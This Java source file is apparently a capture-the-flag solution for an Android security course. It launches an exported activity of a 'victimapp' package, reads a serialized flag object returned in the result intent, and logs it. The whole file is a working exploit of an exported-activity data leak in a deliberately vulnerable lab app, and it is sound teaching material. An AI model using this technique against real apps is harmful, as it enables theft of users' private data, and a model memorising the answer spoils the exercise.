package com.example.serialintent;

import android.content.Intent;
import android.os.Bundle;
import android.util.Log;

import androidx.activity.EdgeToEdge;
import androidx.activity.result.ActivityResultLauncher;
import androidx.appcompat.app.AppCompatActivity;
import androidx.activity.result.contract.ActivityResultContracts;
import android.content.ComponentName;
import java.io.Serializable;

import com.example.victimapp.FlagContainer;

public class MainActivity extends AppCompatActivity {
    private static final String TAG = "MOBIOTSEC";

    public ActivityResultLauncher<Intent> serialIntentLauncher;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        EdgeToEdge.enable(this);
        setContentView(R.layout.activity_main);

        serialIntentLauncher = registerForActivityResult(new ActivityResultContracts.StartActivityForResult(),
                result -> {
                    Intent data = result.getData();
                    if (data != null && data.hasExtra("flag")) {
                        Log.d(TAG, "Received flag extra");

                        FlagContainer flagContainer = (FlagContainer) data.getSerializableExtra("flag");

                        if (flagContainer != null) {
                            String flag = flagContainer.getFlag(); // Assuming getFlag is public
                            Log.d(TAG, "Flag: " + flag);
                        }
                    }
                });

        Intent intent = new Intent();
        intent.setComponent(new ComponentName("com.example.victimapp", "com.example.victimapp.SerialActivity"));
        serialIntentLauncher.launch(intent);
    }
}